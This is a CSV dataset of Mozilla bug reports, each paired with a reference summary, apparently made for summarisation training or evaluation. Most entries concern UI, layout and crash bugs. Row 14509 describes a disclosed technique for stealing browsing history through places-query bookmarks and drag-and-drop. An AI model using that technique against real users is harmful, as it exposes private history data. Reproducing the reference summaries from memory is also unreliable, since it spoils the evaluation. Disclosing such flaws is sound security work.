bug.id,bug_report,ground_truth_summary
13955,"STR:  0. Install profiler from https://profiler.firefox.com/  1. Visit about:blank.  2. Ctrl+Shift+1 to start profiling.  3. Ctrl+T to open a new tab.  4. After a few seconds, Ctrl+Shift+2 to stop profiling.  ACTUAL RESULTS: Profile shows a red bar for a period of jank, which includes some flexbox layout.  In particular, there are some script-triggered sync reflows from an IntersectionObserver callback which checks `.clientWidth`, which I suspect are associated with image lazy-loading.  EXPECTED RESULTS: I suspect the series of short script/IntersectionObserver-triggered reflows should probably be cheap or free, because layout is probably not changing much.  I'm not sure whether the tiles are styled such that we can theoretically infer that the flex containers involved don't need to reflow, or if there's styling that we would need to add (along with optimizations) to reliably get that result -- but one way or another, we should try to be sure that no serious reflow work needs to happen after the initial layout.  Also/alternatively, perhaps the about:newtab code shouldn't be reading clientWidth in the IntersectionObserver callback, since that forces any of the callback's earlier restyling to be immediately flushed. We're probably not coalescing these multiple IntersectionObserver-callback-invocations' restyling at all right now, due to the fact that they're doing this flush.  Here's a profile I captured of the STR, using current Nightly: https://perfht.ml/2SWyogu (filtered for nsFlexContainerFrame) The series of 9 reflows (each 2-3ms long) after timestamp 1.64s are the ones that I'm primarily concerned with improving/avoiding.",New-tab page has some kinda-slow synchronous flexbox/grid layout
14091,"See attachment 310986 [details] close.png - the first state is wrong, I think  I believe that the states should be:  active | hovered | pressed | inactive  the newly checked in close.png has a grey background in the ""normal"" state, which makes it look inactive on luna (see http://img521.imageshack.us/my.php?image=zzvx8.jpg).  Alex: can you update close.png and re-attach? It would be great if we could get this fixed for beta, as I've seen a bunch of people asking about it.",close.png should use close box with red background for active state
14134,"Created attachment 9123950 Toggle Reader View Tooltip.jpg  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0  Steps to reproduce:  Open a page where the Reader view is available - the Reader View icon appears in the address bar.   Press F9 to toggle the Reader Mode.   The tooltip shows VK_F9 instead of F9, see Attachment.  A new profile doesn't fix the problem.   Actual results:  Nothing happens.   Expected results:  The Reader view schould be opened.",Keyboard shortcut for toggle reader view (F9) doesn't work
14155,See https://mozilla.invisionapp.com/share/5ZAEYEW8M#/screens/225203398 .  We should restyle the footer to match the spec. This includes:  - extending it underneath the overflow panel (hamburger panel will be removed) - changing the background/border colours of the footer - updating the titlebar switch imagery / code - adding a 'done' button' next to 'restore defaults' that closes customize mode - ensuring the design works well on narrow window sizes (I'll file a UX bug for this).,Restyle customize mode footer
14173,"Open a private window.  Right-click the private browsing icon. The browser console shows     Error: No nodes without ids that aren't special widgets should ever come into contact with CUI  Click ""Pin to Overflow Menu"". The browser console shows     CustomizableUI:findWidgetInWindow was passed an empty string.     CustomizableUI:Widget '' not found, unable to move  Or click ""Remove from Toolbar"". The browser console shows     CustomizableUI:findWidgetInWindow was passed an empty string.     CustomizableUI:Widget  not found, unable to remove from widget-overflow-fixed-list     Empty string passed to getElementById().",Context menu offers to pin or remove private browsing icon and titlebar placeholders
14370,It has broken due to landing 1025146.  The same thing in the past is happening many times:( Are there no automated test?  Regression window: https://hg.mozilla.org/integration/fx-team/pushloghtml?fromchange=b4018ab42fd3&tochange=2529d411d5b1  REGRESSED BY: Bug 1025146,[non-e10s]and[e10s] external editor (view_source.editor.external) doesn't work on NIGHTLY 41.0a1
14375,Steps to reproduce: 1) Ctrl+Shift+M to open responsive design view 2) Ctrl+Shift+M to exit responsive design view 3) Ctrl+U to open page source  Actual results A blank page (completely white) opened in a new tab  Expected results The page source should have opened in a new tab  Versions tested 53.0a1 (2017-01-16) (64-bit) [issue present] 51.0b14 (64-bit) [issue NOT present] 50.1.0 [issue NOT present],View source open an blank page when using responsive design view
14393,"Created attachment 9035612 translate prompt.mov  master d3368037d569  1. Go to www.lefigaro.fr and select ""No"" when prompted to translate. 2. Long press on a link and select ""Open in New Tab"" 3. Don't switch to the new tab  Expected: The translate prompt should be displayed only when switching to the new tab.  Actual: The translate prompt is displayed in the main page.",The translate prompt is displayed on the main page when opening a link in a background tab
14470,This issue goal is enabling the ExtensionStorageIDB backend on Nightly (and it is going to depend from the bugzilla issues that have been identified as blockers for being able to enable this pref on Nightly).,Enable ExtensionStorageIDB backend on Nightly
14487,"Aaron Benson has made some mocks for adding settings to finely control the pieces of Activity Stream (Highlights, Pocket, Top Sites).",Add settings for toggling Activity Stream
14509,"Created attachment 9057015 poc.htm  User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0  Steps to reproduce:  Using attached PoC:  1. If you don't have bookmarks bar open then open sidebar bookmark page by pressing CTRL+B 2. Drag and drop the anchor tag into the bookmark bar/sidebar  3. Now drag and drop the newly created bookmark into the webpages body     Actual results:  For some reason the dragged object from the bookmark bar contains 'text/html' formatted data of all the queried history entries. Which means we can steal users history data (even loaded iframes) with precision, thanks to the use of the places query.  Step [2] creates a places query ( https://developer.mozilla.org/en-US/docs/Mozilla/Tech/Places/Places_query_URIs ) that looks like:  place:type=0&sort=1&terms=token&maxResults=10&includeHidden=true  I am looking within the users history for any entry with the term 'token' in the URL, for testing purposes I only grab 10 entries but this could be increased in an attack scenario. I also use the 'includeHidden' query operator to include otherwise hidden history entries that come from iframes and images, just to further expand my net.  Step [3] is where I think the bug exists. Once we drag the newly created places query bookmark back into our webpage, we can read all the results from our query by reading the 'text/html' data entry.     Expected results:  There should not be a ''text/html' readable data when drag and dropping bookmarks from firefox and to firefox. I believe this may have been put there for cross application compatibility but is of no use (AFAIK) when it comes to drag and dropping within firefox.",Stealing history data using places querying and drag and drop
14545,"Created attachment 8830619 Test case  I totally did the wrong fix for bug 1329351, the popup was supposed to show on INSECURE password fields even if password manager is off, instead bug 1329351 made it so that it never appears. This is bad because I don't want users to turn off password manager (because sites suggest it) in order to stop the insecure warning. It also means some users wouldn't be protected by this feature we're promoting heavily.  STR: 1) Set signon.rememberSignons = false (Maps to checkbox on the Security tab for pwmgr) 2) Open the testcase 3) Submit some form history for a given <input> @name. 4) Open the autocomplete popup (e.g. down arrow or focus) for a password field with the same @name.  Expected result: Insecure password field warning appears in the dropdown with no other result.  Actual result: No popup appears  [Tracking Requested - why for this release]: No insecure field warning will appear if password manager is disabled",Insecure password field warning doesn't appear on password fields if password manager is disabled
14548,"This won't handle morphing to a single name field, only combining the borders/outlines.",Combine the borders of the name fields on the address form
14661,"saw this in a talkback report filed by Jaime using the 094 branch. I haven't seen this show up before. Incident ID: 36728446  nsMsgDatabase::RowCellColumnToCharPtr [d:\builds\seamonkey\mozilla\mailnews\db\msgdb\src\nsMsgDatabase.cpp, line 2917] nsMsgHdr::GetSubject [d:\builds\seamonkey\mozilla\mailnews\db\msgdb\src\nsMsgHdr.cpp, line 592] nsMsgDatabase::ThreadNewHdr [d:\builds\seamonkey\mozilla\mailnews\db\msgdb\src\nsMsgDatabase.cpp, line 3255] nsMsgDatabase::AddNewHdrToDB [d:\builds\seamonkey\mozilla\mailnews\db\msgdb\src\nsMsgDatabase.cpp, line 2582] nsMsgMailboxParser::PublishMsgHeader [d:\builds\seamonkey\mozilla\mailnews\local\src\nsParseMailbox.cpp, line 352] nsMsgMailboxParser::HandleLine [d:\builds\seamonkey\mozilla\mailnews\local\src\nsParseMailbox.cpp, line 416] nsMsgLineBuffer::ConvertAndSendBuffer [d:\builds\seamonkey\mozilla\mailnews\base\util\nsMsgLineBuffer.cpp, line 219] nsMsgLineBuffer::BufferInput [d:\builds\seamonkey\mozilla\mailnews\base\util\nsMsgLineBuffer.cpp, line 192] nsMsgMailboxParser::ProcessMailboxInputStream [d:\builds\seamonkey\mozilla\mailnews\local\src\nsParseMailbox.cpp, line 273] nsMsgMailboxParser::OnDataAvailable [d:\builds\seamonkey\mozilla\mailnews\local\src\nsParseMailbox.cpp, line 75] nsMailboxProtocol::ReadFolderResponse [d:\builds\seamonkey\mozilla\mailnews\local\src\nsMailboxProtocol.cpp, line 503] nsMailboxProtocol::ProcessProtocolState [d:\builds\seamonkey\mozilla\mailnews\local\src\nsMailboxProtocol.cpp, line 663] nsMsgProtocol::OnDataAvailable [d:\builds\seamonkey\mozilla\mailnews\base\util\nsMsgProtocol.cpp, line 246] nsOnDataAvailableEvent::HandleEvent [d:\builds\seamonkey\mozilla\netwerk\base\src\nsStreamListenerProxy.cpp, line 188] PL_HandleEvent [d:\builds\seamonkey\mozilla\xpcom\threads\plevent.c, line 591]",crash in mailnews  [@ MSVCRT.DLL - nsMsgDatabase::RowCellColumnToCharPtr]
14760,"I've no clue why this brings up mutiple ""Save As"" dialog once this web page is loaded. Very annonying :)  Build: Todays commercial build on Win NT.","when this web page loads it brings up a ""save as"" dialog."
14798,"When the bookmarks or history panel is animating out over the library panel, but not fully open yet, the library panel disappears (or animates out, I can't tell which) which feels distracting. I think it would look better if the background library panel stayed put until the bookmarks/history panel had fully animated out.  Compare with the animation of the library panel on top of the main menu where the main menu stays put.",library panel shouldn't close until bookmarks / history panel has animated all the way out
14826,"Created attachment 8782482 permission misalignment.png  [Affected versions]: - 51.0a1 (2016-08-18)  [Affected platforms]: - Win 7  [Steps to reproduce]: 1. Open any page 2. Open the Control Center, expand it, then click on More Info/Permissions 3. Change some permissions from the default state (e.g. set microphone to 'Block') 4. Open the Control Center again  [Expected result]: - Allow/Block aligned with the X button  [Actual result]: - misalignment between Allow/Block and the X button  [Regression range]: - caused by bug 1290174  [Additional notes]: - Windows only",X button is vertically misaligned on the permission dropdown
14843,"Targeting for 2.2.3, the mobile site merging with desktop (which doesn't exist at the moment).  We'll need a mobile home page for that.",Import CSS+graphics for mobile.SUMO modules
14910,"Created attachment 8988512 Empty state for font editor should not show up.  The patch for Bug 1464796 accidentally removed a guard that now causes the FontEditor to show up in its empty state with the message ""No fonts were found for the current element"" even when the FontEditor pref is OFF.   This has slipped into the 62 build, currently in Beta.",Font editor: Empty state for FontEditor mistakenly shows up when its pref is OFF
14926,"Originally posted by:linclark  see https://github.com/devtools-html/gecko-dev/issues/196  Parent issue: #140   Where it is received: https://dxr.mozilla.org/mozilla-central/source/devtools/client/webconsole/webconsole.js#3348  Where it comes from: 10 different places, starting here https://dxr.mozilla.org/mozilla-central/source/devtools/server/actors/webconsole.js#2064",Support network event update messages #196
14930,"- the ""performance"" icon in the summary info should change opacity on mouseover. There are rules for "".devtools-button::before"" that do this, but they don't apply in this case. - the colors of the performance icon and the summary text should be the same. They aren't in the dark theme - white vs lightblue  This CSS issue is spotted by Jarda https://bugzilla.mozilla.org/show_bug.cgi?id=1309194#c50. There are existed problems in summary button and it needs CSS improvement.",CSS improvement for summary button
14947,"The fix in bug 1303279 works on the first replaceTrack/renegotiation, but fails in subsequent ones.  this is because mSendingWidth is reset to 0 later in that call, and if nothing else tweaks it, we'll fail to copy the data on future replace/renegotiations.",Resolution for outbound video stream drops to 352x288 on replacing video track during webrtc call.
15118,"Please remove mention of Uberview in the ""Organize your tabs"" text.   It should say ""Reclaim your browser from tab clutter! Drag and drop your tabs into manageable groups that you can organize, name and arrange in a fun and visual way.""",Remove Uberview mention on beta features page.
15119,"Please remove mention of Uberview in this page.   Copy should read ""Having a hard time keeping track of all your open tabs? Reclaim your browser from tab clutter! Easily drag and drop your tabs into manageable groups that you can organize, name and arrange in a fun and visual way.""",Remove Uberview mention on beta whats new page
